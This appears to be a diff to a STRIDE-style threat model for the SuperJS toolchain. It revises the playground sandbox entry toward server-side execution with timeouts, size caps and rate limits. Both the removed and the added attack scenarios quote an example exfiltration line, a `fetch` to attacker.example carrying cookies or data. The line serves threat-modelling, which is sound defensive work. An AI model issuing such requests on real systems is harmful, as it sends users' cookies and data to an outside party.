@@ -36,7 +36,7 @@
 | T1 | Parser — pathological nesting | DoS via deeply nested expressions (`((((x))))` 10 000 deep), huge identifiers, or quadratic lookahead | **Denial of Service** | Nesting depth limit ≤ 1 000; identifier length cap 16 384 chars; O(n) lexer guarantee; `SJS-P099` after 3 failed recoveries | Stage 1 | Planned |
 | T2 | Lexer — massive token streams | DoS via 100 MB string literals, Unicode escape loops, or token-count explosion | **Denial of Service** | Per-file token limit 10 M; per-token 1 MiB cap; Unicode escape flood guard (>256 consecutive); early `SJS-P002` abort | Stage 1 | Planned |
 | T3 | LSP message handling | Malformed/oversized JSON-RPC crashes or hangs the LSP server; malicious workspace config injects options | **Tampering / Denial of Service** | Message size cap 8 MiB; JSON schema validation before dispatch; no `eval`/`exec` in LSP server; config validated against `spec/config-schema.json` | Stage 1 | Planned |
-| T4 | Playground sandbox isolation | Browser REPL evaluates untrusted SJS; sandbox escape reads cookies or makes cross-origin requests | **Elevation of Privilege / Information Disclosure** | Web Worker with no DOM access; `<iframe sandbox>` + strict CSP (`no unsafe-eval`, `connect-src 'none'`); no Node.js APIs in worker | Stage 3 | Planned |
+| T4 | Playground sandbox isolation | Untrusted SJS executed server-side (`/api/run`, CF Worker) or in sandboxed iframe; escape could run arbitrary JS, exfiltrate data, or abuse compute | **Elevation of Privilege / Denial of Service** | Server path: `new Function` with 5 s timeout, 50 kB cap, 20 req/min per IP, no `fetch`/`fs`/`process` in scope; CF Worker + Next.js fallback; client iframe: `sandbox="allow-scripts"`, CSP `default-src 'none'`; feature flag `NEXT_PUBLIC_USE_WORKERS_SANDBOX` | Stage 3 / v1.0 | **Partially mitigated** (#192 server run; CF deploy via `workflow_dispatch`) |
 | T5 | Supply-chain: `--provenance` | Compromised CI or stolen npm token pushes tampered `@superjs/*` package | **Tampering** | SLSA Level 2; publishes via GitHub Actions only; `npm publish --provenance`; 2FA required on all publish accounts; Dependabot on all dep files | Stage 0 | Partially mitigated (policy in place; attestation active from first publish) |
 | T6 | BiDi-spoofing in source | U+202A–U+202E, U+2066–U+2069 make code appear different from what compiles (Trojan Source, CVE-2021-42574) | **Tampering / Spoofing** | Default: `SJS-W012` warning; strict (`--strict-bidi`): `SJS-L011` error; inside identifiers: always rejected | Stage 1 | Partially mitigated (SJS-W012 registered; lexer enforcement in Stage 1) |
 | T7 | Crash-log data leakage | `.superjs/crash-*.log` contains full paths and symbol names; leaks codebase layout when shared in bug reports | **Information Disclosure** | Basenames only by default (R4 policy); full paths opt-in via `--crash-full`; logs excluded from git via `superjs init` | Stage 0/1 | Implemented (SECURITY.md policy; Stage 1 enforces in crash handler) |
@@ -102,19 +102,31 @@
 
 ### T4 — Playground Sandbox Isolation
 
-**Description.** The browser-based REPL (Stage 3 website feature) compiles and evaluates user-supplied SJS code in the browser. An unsafe evaluation context could read `document.cookie`, make cross-origin requests, or exfiltrate data.
+**Description.** The website playground compiles and executes user-supplied SJS. Execution paths (v1.0):
 
-**Attack scenario.** A user pastes SJS that compiles to `fetch('https://attacker.example/steal?data=' + document.cookie)`. If the snippet runs in the main page context, this succeeds.
+1. **Server-side** — `POST /api/run` (Next.js Node runtime) or Cloudflare Worker (`apps/playground-worker`). Compiled JS runs via `new Function` with a captured `console`.
+2. **Client fallback** — sandboxed `<iframe sandbox="allow-scripts">` when the server path is unavailable (`NEXT_PUBLIC_USE_WORKERS_SANDBOX=false` or 5xx).
 
-**Mitigations:**
+An unsafe context could read cookies (main thread), make network requests, or exhaust server CPU.
 
-- The playground compiler and evaluator run in a **dedicated Web Worker** with no access to `document`, `window`, `localStorage`, or any DOM API.
-- The website's `Content-Security-Policy` header includes: `default-src 'self'`; no `unsafe-inline`; no `unsafe-eval`; `connect-src 'none'` for the worker context; `sandbox allow-scripts` on the playground iframe.
-- Compiled output is executed via a `Function` constructor **inside the worker** only, not `eval` in the main context. This use is intentional and documented; the ESLint `no-eval` rule has a scoped exception for `packages/playground/src/worker.ts`.
-- No Node.js built-ins (`fs`, `child_process`, `net`, etc.) are bundled into the playground worker. The build config explicitly externalises all built-ins and fails if any sneak in.
-- The SJS compiler will be compiled to **WebAssembly** (Stage 1 LLVM backend) for playground use, further isolating the compiler-code attack surface from the browser JS heap.
+**Attack scenario.** A user submits SJS that compiles to an infinite loop or attempts `fetch('https://attacker.example/leak')` from the server runner.
 
-**Owner Stage:** Stage 3 (playground website); WebAssembly isolation follows Stage 1 LLVM backend.
+**Mitigations (shipped v1.0):**
+
+- **Input cap:** 50 kB max source per request (`413` when exceeded).
+- **Rate limit:** 20 requests/minute per IP (`429` + `Retry-After`); in-isolate bucket (use CF Rate Limiting for global enforcement on Worker deploy).
+- **Execution timeout:** 5 seconds per run; errors returned in response body.
+- **Sandbox scope:** runner does not inject `fetch`, `fs`, `process`, or `child_process` into the function scope.
+- **Client iframe:** `sandbox="allow-scripts"` only (no `allow-same-origin`); CSP `default-src 'none'`; `postMessage` for console output only.
+- **CORS on Worker:** `Access-Control-Allow-Origin: *` for `POST /run` only (no credentials).
+- **Fallback banner:** UI shows "sandbox unavailable" when falling back to compile-only + iframe.
+
+**Residual risks:**
+
+- Per-isolate rate limiting does not cap abuse across CF edge nodes — enable CF Rate Limiting when Worker is deployed to production.
+- `new Function` on Node has more ambient globals than the iframe path; keep Worker and `/api/run` on isolated infrastructure, not co-located with secrets.
+
+**Owner Stage:** Stage 3 / v1.0 (#192, playground-worker deploy workflow).
 
 ---
 
